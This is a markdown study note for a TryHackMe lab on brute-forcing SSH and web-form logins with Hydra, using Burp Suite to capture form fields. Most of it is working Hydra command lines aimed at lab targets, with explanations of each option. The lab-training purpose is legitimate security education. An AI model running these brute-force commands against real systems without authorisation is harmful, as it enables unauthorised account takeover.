# Hydra Brute-Forcing (TryHackMe)

A guide to using Hydra for brute-forcing credentials on SSH and web forms, including setup and execution on the TryHackMe AttackBox.


## Hydra Commands

Hydra options vary by protocol (e.g., SSH, HTTP POST). Below are commands and explanations for brute-forcing SSH and web form logins.

### SSH Brute-Forcing

**Command**:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP -t 4 ssh
```

**Options**:

- `-l`: Specifies the SSH username (e.g., `root`).
- `-P`: Path to the password wordlist (e.g., `passwords.txt`).
- `-t 4`: Runs 4 parallel threads for faster execution.

**Example**:

```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

- Uses `root` as the username.
- Tries passwords from `passwords.txt`.
- Runs 4 threads.

### Web Form Brute-Forcing (POST)

**Command Structure**:

```bash
sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>" -V
```

**Options**:

- `-l`: Username for the web form.
- `-P`: Path to the password wordlist.
- `http-post-form`: Specifies a POST form request.
- `<path>`: Login page URL (e.g., `/login` or `/`).
- `<login_credentials>`: Form fields, e.g., `username=^USER^&password=^PASS^`.
- `<invalid_response>`: String in the server’s response for failed logins (e.g., `F=incorrect`).
- `-V`: Enables verbose output for each attempt.

**General Example**:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- Targets the root URL (`/`).
- Replaces `^USER^` with the specified username and `^PASS^` with passwords from the wordlist.
- Filters failed attempts with `F=incorrect`.

## Burp Suite Integration

To craft a precise Hydra command for a web form:

1. Use **Burp Suite** to capture the login request.
2. Identify the form fields (e.g., `username=go&password=gpgp`).
3. Insert these into the Hydra command, replacing the form fields with `^USER^` and `^PASS^`.

**Example with Captured Request**:

Captured form data: `username=go&password=gpgp`.

**Hydra Command**:

```bash
hydra -l go -P <wordlist> 10.10.33.146 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V
```

- `-l go`: Uses `go` as the username (from captured data).
- `<wordlist>`: Path to the password list.
- `10.10.33.146`: Target machine IP.
- `/login`: Login page path.
- `username=^USER^&password=^PASS^`: Matches the captured form fields.
- `Your username or password is incorrect.`: Failure response string.
- `-V`: Shows verbose output.

> [!tip]  
> Use Burp Suite’s Proxy to capture form data and ensure accurate `<login_credentials>` and `<invalid_response>` values for Hydra.

## Notes

- **Request Type**: Confirm whether the form uses GET or POST via Burp Suite or browser developer tools (Network tab or source code).
- **Wordlists**: Use SecLists or custom wordlists for passwords.
- **Threading**: Adjust `-t` (e.g., `-t 4`) to balance speed and server load.
- **Verbose Output**: The `-V` flag helps debug by showing each attempt’s result.

#Hydra #TryHackMe #BruteForce #BurpSuit